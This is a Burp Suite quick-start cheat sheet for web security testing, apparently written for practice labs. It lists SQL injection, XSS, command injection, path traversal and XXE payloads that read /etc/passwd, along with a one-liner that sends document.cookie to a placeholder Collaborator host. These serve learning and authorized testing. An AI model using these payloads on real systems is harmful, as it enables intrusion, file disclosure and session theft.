# Essential Skills - Quick Start Guide

**Quick reference for essential web application security testing techniques**

---

## Core Techniques

### Targeted Scanning

**When to Use:** Time constraints or identified suspicious endpoint

**How:**
1. Find request in Proxy History
2. Right-click → "Do active scan"
3. Select "All except time-based detection" (fastest)
4. Review findings in real-time (don't wait for completion)

**Key Benefit:** 10x faster than full-site scan

---

### Scan Selected Insertion Point

**When to Use:** Non-standard data structures (colon-separated, pipe-delimited, JSON-in-cookie)

**How:**
1. Send request to Repeater
2. Highlight ONLY the portion to test (e.g., username in `user:token`)
3. Right-click highlighted text → "Scan selected insertion point"
4. Review findings

**Example Data Structures:**
- `session=username:token` (test username separately)
- `data=id|role|prefs` (test each pipe-separated value)
- `auth={"user":"admin","role":"guest"}` (test JSON keys)

---

## Encoding Bypass Cheat Sheet

### URL Encoding
```
< = %3C
> = %3E
' = %27
" = %22
/ = %2F
```

**Double Encoding:**
```
/ = %2F = %252F
```

### HTML Entities
```
< = &lt; = &#60; = &#x3C;
> = &gt; = &#62; = &#x3E;
' = &#39; = &#x27;
```

### XML Entities (for SQL keyword bypass)
```
UNION = &#85;NION
SELECT = &#83;ELECT
```

**Lab Example:**
```xml
<storeId>1 &#85;NION &#83;ELECT username FROM users--</storeId>
```

### SQL CHAR() Function
```sql
-- Instead of 'admin'
CHAR(97,100,109,105,110)

-- Instead of ' OR '1'='1
CHAR(39) OR CHAR(39,49,39,61,39,49)
```

### JavaScript Unicode
```javascript
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
// alert(1) in Unicode
```

---

## Mystery Lab Strategy

**Reconnaissance (15 min):**
1. Browse all features
2. Identify input points (forms, parameters, file uploads)

**Hypothesis (5 min):**
- Authentication feature → Brute force, 2FA bypass
- Search → SQLi, XSS
- File upload → RCE, path traversal
- Comments → Stored XSS, CSRF
- Admin panel → Access control

**Testing Checklist (30 min):**
- [ ] SQL Injection: `' OR '1'='1'--`, `1' UNION SELECT NULL--`
- [ ] XSS: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
- [ ] Access Control: Try accessing `/admin`, manipulate IDs
- [ ] Path Traversal: `../../../../etc/passwd`
- [ ] Command Injection: `; whoami`, `| whoami`
- [ ] XXE: Test XML endpoints with entity payloads
- [ ] CSRF: Check for anti-CSRF tokens

**Exploitation (15 min):**
- Once identified, craft specific exploit
- Complete lab objective

---

## Burp Suite Quick Commands

### Scanner Configuration
```
Scanner → Scan configuration → New scan configuration
Audit checks → All except time-based detection ✓
```

### Collaborator
```
Burp menu → Burp Collaborator client → Copy to clipboard
Use in payloads: YOUR-ID.oastify.com
Poll for results: Click "Poll now"
```

### Repeater Shortcuts
```
Ctrl+R / Cmd+R = Send to Repeater
Ctrl+I / Cmd+I = Send to Intruder
Ctrl+Space = Send request
```

### Decoder
```
Burp menu → Decoder
Paste text → Select encoding from dropdown
URL, HTML, Base64, Hex, etc.
```

---

## Common Mistakes

❌ Running full-site scans (wastes time)
❌ Ignoring scanner findings (missing hints)
❌ Not encoding payloads properly (bypasses fail)
❌ Waiting for scan completion (review in real-time)
❌ Testing everything manually (use scanner for thoroughness)

✅ Targeted scans on suspicious endpoints
✅ Review scanner findings as they appear
✅ Combine scanner + manual testing
✅ Use encoding for filter bypass
✅ Scan selected insertion points for custom structures

---

## One-Liner Cheat Sheet

**XXE (XInclude):** `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`

**Cookie XSS exfiltration:** `<script>location='https://COLLAB/?c='+document.cookie</script>`

**Non-standard data:** Login → observe `user:token` cookie → scan username insertion point → exploit XSS → steal session

**General workflow:** Recon → Hypothesize → Test (SQLi, XSS, Access Control) → Exploit

**Encoding Bypass:** Try single encoding → double encoding → XML/HTML entities → Unicode → CHAR()

**Scanner priority:** Targeted scan (specific request) > Scan selected insertion point (custom location) > Full scan (avoid)

---

## Reference URLs

- **Burp Suite docs:** https://portswigger.net/web-security/essential-skills
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
